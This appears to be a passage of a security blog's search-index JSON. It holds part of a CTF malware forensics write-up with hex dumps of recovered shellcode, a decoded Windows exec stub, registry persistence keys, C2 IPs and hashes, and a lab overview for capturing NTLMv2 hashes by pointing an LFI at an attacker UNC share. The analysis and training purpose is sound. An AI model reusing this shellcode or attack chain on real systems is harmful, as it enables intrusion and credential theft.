c3fb 4766 9b70 35b6 530c c8e6\n2b1d 9a4c e66c d599 be5f d5b5 03c1 a9c7\n5721 1306 6e2c d289 b0cd 39db 7343 8a50\n2143 8124 facb 9478 894c 1e78 8e4c 57fd\n4e38 00b5 4f11 9ece 1889 5b5b d889 2a5a\n092a fa14 5664 422f 9cff 0d2e 0bb2 bcf9\nfb7c 7f55 babf b6a8 7c41 888a 9e34 fba6\n5dfb df3e 273a f14b 7f64 b538 3fb1 7c3f\n10df 3fb4 9c68 8441 dc74 4d54 0dc5 c652\n258e d98a 7457 9b72 293e 41c3 8d81 2c82\n774a 4ce8 a80b 000f 48d3 e5b6 d3ac 6e5a\n0d7b 8ea5 32d9 38e3 cce2 b813 cfe2 b813\n876f 3512 1670 4655 a241 cd3a 555e 047f\na914 0529 0bed ec40 368c 0ebf 012c 3417\nae34 c96d 4ec3 d104 4b8f 55f5 2180 33f9\n9c1f 4d23 e175 2ebe 7a56 9e23 a3b1 85c0\ncbd2 6550 6764 2306 042f fcd5 dc86 4475\n5b7f 27ed dc25 f4b4 9293 8321 3e6e 0dca\nb125 8424 47f0 6537 c861 d9c4 620f ee1a\nfa84 693e c556 f38e 472c 6d81 d7fe 2236\n6ba6 a3f5 b67f 2c\n</code></pre> </li> <li> <p>Emulation-decoded shellcode: /tmp/recovered_flag/orhmkbye_sc32_decoded.bin</p> <pre><code>dac1 bae6 64fa 72d9 7424 f458 2bc9 b158\n3150 1783 e8fc 0350 13e2 f5fc 4883 e4f0\ne8c0 0000 0041 5141 5052 5156 4831 d265\n488b 5260 488b 5218 488b 5220 488b 7250\n480f b74a 4a4d 31c9 4831 c0ac 3c61 7c02\n2c20 41c1 c90d 4101 c1e2 ed52 4151 488b\n5220 8b42 3c48 01d0 8b80 8800 0000 4885\nc074 6748 01d0 508b 4818 448b 4020 4901\nd0e3 5648 ffc9 418b 3488 4801 d64d 31c9\n4831 c0ac 41c1 c90d 4101 c138 e075 f14c\n034c 2408 4539 d175 d858 448b 4024 4901\nd066 418b 0c48 448b 401c 4901 d041 8b04\n8848 01d0 4158 4158 5e59 5a41 5841 5941\n5a48 83ec 2041 52ff e058 4159 5a48 8b12\ne957 ffff ff5d 48ba 0100 0000 0000 0000\n488d 8d01 0100 0041 ba31 8b6f 87ff d5bb\nf0b5 a256 41ba a695 bd9d ffd5 4883 c428\n3c06 7c0a 80fb e075 05bb 4713 726f 6a00\n5941 89da ffd5 636d 6420 2f63 2027 6563\n686f 2056 6b49 455a 7359 5763 3649 466c\n7a66 6e68 475a 4359 704a 7967 6d4a 7967\n714b 6930 754a 3373 6f65 5373 7465 3330\n714b 7964 394c 7930 724b 6e6f 704c 536b\n7359 673d 3d27 00\n</code></pre> </li> <li> <p>Intermediate transformed bytes: /tmp/recovered_flag/flag_transform.bin</p> </li> <li>Token file: /tmp/recovered_flag/flag_token.txt</li> </ol> </li> <li> <p>IOC list</p> <p>File hashes:</p> <ul> <li>C:\\Users\\FlagYard\\Desktop\\Chrome.exe SHA256 8655D2CBB9CDA288943B6C3DEEBD694CB92A9236A80555E6CC425D551C55FEE3 (from Sysmon)</li> <li>815624.bat (/C/Users/FlagYard/AppData/Local/ ce3f5d/815624.bat) SHA256 1554002ed3d543c0cfe2cf336f4c04f5924d3d15077ef2a5d5971c0444b6e0db</li> <li>dcf991.9f2207a (/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a) SHA256 60f248283b2939ce08ada1c94026dc668aecab8547398641af59148e65f8dd7c</li> <li>Decoded Shikata shellcode SHA256 168b2d2ecdf53359f6d0c09a7108a31f60ecc9c0005e8d1c84a4d7b6545f6789</li> <li>Final PE payload SHA256 0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li> </ul> <p>Registry IOCs:</p> <ul> <li>HKCU\\software\\99qzf2N\\hDF82oB</li> <li>HKCU\\software\\99qzf2N\\WmmbDZ</li> <li>HKCU\\software\\lirs\\orhmkbye</li> <li>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (value:C:\\Users\\FlagYard\\AppData\\Local\\ce3f5d[815624.ba](http://815624.ba/)t)</li> <li>HKU\\_Classes\\bfcf36\\shell\\open\\command (mshta JS launcher)</li> </ul> <p>Network IOCs observed (regsvr32 connections):</p> <ul> <li>13.224.161.254</li> <li>117.135.215.187</li> <li>185.139.2.168</li> <li>162.243.38.153</li> <li>154.221.98.239</li> </ul> <p></p> </li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36","tags":["Forensics","Malware Analysis"]},{"location":"ctf/forensics/shikataganai/#summary","title":"Summary","text":"<p>Attack Chain</p> <ul> <li>Initial execution was user-launched <code>Chrome.exe](C/Users/FlagYard/Desktop/Chrome.exe</code> from Desktop at 2025-06-0311:50:34.836 (from Sysmon), masquerading asPDF-XChange Viewer SHA256:8655d2cbb9cda288943b6c3deebd694cb92a9236a80555e6cc425d551c55fee3).</li> <li>Very shortly after, mshta.exe was launched with inline JS that reads and evals registry JS from HKCU\\software\\99qzf2N\\hDF82oB (seen in sysmon_u16.txt around 11:50:35.894).</li> <li>mshta.exe then launched PowerShell (iex $env:zpztyd) to run in-memory shellcode loaders (see decoded_stage2.js and stage3.ps1).</li> <li>Later, Chrome.exe injected into regsvr32.exe (2025-06-03 11:53:35.699), and regsvr32.exe performed the persistence setup and follow-on execution.</li> </ul> <p>Persistence</p> <ul> <li>Run key persistence:<ul> <li>HKU\\...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -&gt; \"C:\\Users\\FlagYard\\AppData\\Local\\ce3f5d\\815624.bat\"</li> </ul> </li> <li>Secondary trigger key:<ul> <li>HKU\\...\\_Classes\\bfcf36\\shell\\open\\command\\(Default) -&gt; mshta JS that reads HKCU\\software\\lirs\\orhmkbye</li> </ul> </li> <li>On-disk launcher:<ul> <li>[815624.bat]<code>/C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat\"</code> runs[dcf991.9f2207a]<code>/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a</code>.</li> </ul> </li> </ul> <p>Final Payload (What It Does)</p> <ul> <li>Final stage is registry-resident in HKCU\\Software\\99qzf2N\\WmmbDZ (very large value).</li> <li>The 2908-byte shellcode (from PowerShell Operational logs) resolves RegOpenKeyExA/RegQueryValueExA, reads WmmbDZ, RC4-decrypts it, and reflectively loads a PE in memory.</li> <li>I decrypted it successfully from artifact bytes:<ul> <li>Output PE: /tmp/final_payload.bin</li> <li>SHA256: 0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li> <li>PE32, ~438 KB</li> </ul> </li> <li>Behavior from payload strings/capabilities: dynamic API resolution, WinSock/network (connect, gethostbyname), HTTP POST + browser-like User-Agent strings, and in-memory execution flow (consistent with backdoor/downloader behavior, not just a one-shot dropper).</li> </ul> <p>IOCs</p> <ul> <li> <p>Files/hashes:</p> <ul> <li>[hDF82oB] SHA256: 7f3b68e6d921f29cb721fc9aceb051178e7aa37d29ab761c85358dbd11121f72</li> <li>815624.bat SHA256: 1554002ed3d543c0cfe2cf336f4c04f5924d3d15077ef2a5d5971c0444b6e0db</li> <li>dcf991.9f2207a SHA256: 60f248283b2939ce08ada1c94026dc668aecab8547398641af59148e65f8dd7c</li> <li>/tmp/final_payload.bin SHA256: 0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li> </ul> <p></p> <p></p> <p></p> </li> <li> <p>Registry:</p> <ul> <li>HKCU\\Software\\99qzf2N\\hDF82oB</li> <li>HKCU\\Software\\99qzf2N\\WmmbDZ</li> <li>HKCU\\Software\\lirs\\orhmkbye</li> <li>HKU\\...\\_Classes\\bfcf36\\shell\\open\\ \\command\\(Default)</li> <li>HKU\\...\\Software\\Microsoft\\Windows\\ \\CurrentVersion\\Run\\</li> </ul> </li> <li>Process chain:<ul> <li>Chrome.exe -&gt; mshta.exe -&gt; powershell.exe</li> <li>Chrome.exe -&gt; injects regsvr32.exe</li> </ul> </li> <li>C2/egress IPs observed from regsvr32.exe:<ul> <li>13.224.161.254</li> <li>117.135.215.187</li> <li>185.139.2.168</li> <li>162.243.38.153</li> <li>154.221.98.239</li> </ul> </li> </ul> <p>The shellcode decodes to a windows/x64/exec stub that runs:</p> <p>cmd /c 'echo VkIEZsYWc6IFlzfnhGZCYpJygmJygqKi0uJ3soeSste30qKyd9Ly0rKnopLSksYg=='</p>","tags":["Forensics","Malware Analysis"]},{"location":"labs_simulate/","title":"Overview","text":""},{"location":"labs_simulate/#available-labs","title":"Available Labs","text":"<ul> <li>automated-lfi-to-ntlmv2-lab</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/","title":"Automated LFI to NTLMv2 Lab","text":""},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#automated-lfi-to-ntlmv2-lab","title":"Automated LFI to NTLMv2 Lab","text":""},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#overview","title":"Overview","text":"<p>This lab simulates a real-world attack chain where a Local File Inclusion (LFI) vulnerability is abused to trigger outbound SMB authentication, allowing an attacker to capture NTLMv2 hashes.</p> <p>The environment is designed for offensive security practice, focusing on:  Web exploitation, Windows authentication abuse, Credential interception.</p>"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#repository","title":"Repository","text":"<p>\ud83d\udd17 GitHub: https://github.com/dhicosatria/automated-lfi-to-ntlmv2-lab</p>"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#attack-flow","title":"Attack Flow","text":"<ol> <li>Identify LFI vulnerability in the web application</li> <li>Use LFI to access a UNC path (<code>\\\\\\\\attacker\\\\share</code>)</li> <li>Victim server initiates SMB authentication</li> <li>Capture NTLMv2 hash using Responder</li> <li>(Optional) Crack hash offline</li> </ol>"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#tools-used","title":"Tools Used","text":"<ul> <li>Docker / Docker Compose</li> <li>Apache / PHP</li> <li>Responder</li> <li>Impacket</li> <li>Hashcat</li> </ul>"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#learning-objectives","title":"Learning Objectives","text":"<ul> <li>Understand NTLM authentication flow</li> <li>Abuse LFI beyond file reading</li> <li>Capture and analyze NTLMv2 hashes</li> <li>Simulate realistic internal attack scenarios</li> </ul>"},{"location":"labs_simulate/automated-lfi-to-ntlmv2-lab/#disclaimer","title":"Disclaimer","text":"<p>This lab is intended for educational and authorized testing purposes only.</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"project/","title":"Overview","text":"2026-02-28 20:23:362026-03-01 01:23:36"}]}